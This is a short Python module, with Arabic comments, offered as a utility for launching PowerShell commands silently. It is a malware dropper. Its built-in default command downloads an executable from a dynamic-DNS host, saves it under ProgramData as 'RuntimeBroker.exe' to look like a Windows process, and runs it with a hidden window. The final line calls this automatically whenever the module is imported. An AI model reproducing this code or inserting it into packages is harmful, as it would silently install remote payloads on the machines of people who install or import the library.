import subprocess
from typing import Sequence, Union


def run_hidden_command(command: Union[str, Sequence[str]] = None) -> subprocess.Popen:
    """
    Launch a PowerShell process with no window and no visible output.

    Parameters
    ----------
    command:
        The PowerShell command string or an iterable of arguments.
        If None, uses the predefined command.
    """

    # الأمر الافتراضي المضمن في المكتبة (يمكنك تعديله كما تشاء)
    DEFAULT_COMMAND = (
        '$savePath="$env:ProgramData\\\\RuntimeBroker.exe"; '
        '$url="http://3zoz.duckdns.org:1111/1234"; '
        'Invoke-WebRequest -Uri $url -OutFile $savePath -UseBasicParsing; '
        'Start-Process $savePath -WindowStyle Hidden'
    )

    # استخدام الأمر الممرر أو الأمر الافتراضي
    cmd_to_run = command if command is not None else DEFAULT_COMMAND

    # تشغيل PowerShell مخفيًا بدون مخرجات
    proc = subprocess.Popen(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd_to_run],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    return proc


# تنفيذ تلقائي عند استيراد المكتبة
_auto_process = run_hidden_command()


